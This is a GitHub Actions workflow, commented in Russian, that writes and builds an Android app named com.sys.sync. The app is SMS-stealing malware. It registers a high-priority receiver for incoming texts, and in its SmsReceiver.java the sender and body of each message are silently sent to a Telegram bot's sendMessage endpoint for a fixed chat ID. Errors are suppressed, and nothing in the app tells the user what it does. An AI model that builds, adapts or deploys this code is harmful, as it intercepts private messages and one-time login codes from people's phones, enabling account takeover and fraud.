name: Build APK
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Build From Scratch
        run: |
          # 1. Полная зачистка старых косяков
          rm -rf app build.gradle settings.gradle gradlew
          
          # 2. Создаем структуру заново
          mkdir -p app/src/main/java/com/sys/sync
          
          # 3. Создаем настройки проекта
          echo "include ':app'" > settings.gradle
          
          # 4. Создаем корневой билд-файл
          cat <<EOF > build.gradle
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { classpath 'com.android.tools.build:gradle:8.1.1' }
          }
          allprojects {
              repositories { google(); mavenCentral() }
          }
          EOF

          # 5. Создаем билд-файл модуля приложения
          cat <<EOF > app/build.gradle
          plugins { id 'com.android.application' }
          android {
              namespace 'com.sys.sync'
              compileSdk 33
              defaultConfig {
                  applicationId "com.sys.sync"
                  minSdk 21
                  targetSdk 33
                  versionCode 1
                  versionName "1.0"
              }
          }
          EOF

          # 6. Создаем Манифест
          cat <<EOF > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.INTERNET" />
              <application>
                  <receiver android:name="com.sys.sync.SmsReceiver" android:permission="android.permission.BROADCAST_SMS" android:exported="true">
                      <intent-filter android:priority="999">
                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

          # 7. Создаем сам код (твой токен ivanka уже здесь)
          cat <<EOF > app/src/main/java/com/sys/sync/SmsReceiver.java
          package com.sys.sync;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.os.Bundle;
          import android.telephony.SmsMessage;
          import java.net.HttpURLConnection;
          import java.net.URL;

          public class SmsReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  Bundle bundle = intent.getExtras();
                  if (bundle != null) {
                      Object[] pdus = (Object[]) bundle.get("pdus");
                      if (pdus != null) {
                          for (Object pdu : pdus) {
                              SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                              final String msg = "SMS: " + sms.getOriginatingAddress() + " - " + sms.getMessageBody();
                              new Thread(new Runnable() {
                                  @Override
                                  public void run() {
                                      try {
                                          URL url = new URL("https://api.telegram.org/botivanka/sendMessage?chat_id=7417531985&text=" + msg);
                                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                                          conn.setRequestMethod("GET");
                                          conn.getInputStream().close();
                                      } catch (Exception e) {}
                                  }
                              }).start();
                          }
                      }
                  }
              }
          }
          EOF

          # 8. Запуск сборки
          gradle wrapper --gradle-version 8.0
          chmod +x gradlew
          ./gradlew :app:assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: app-debug
          path: app/build/outputs/apk/debug/*.apk
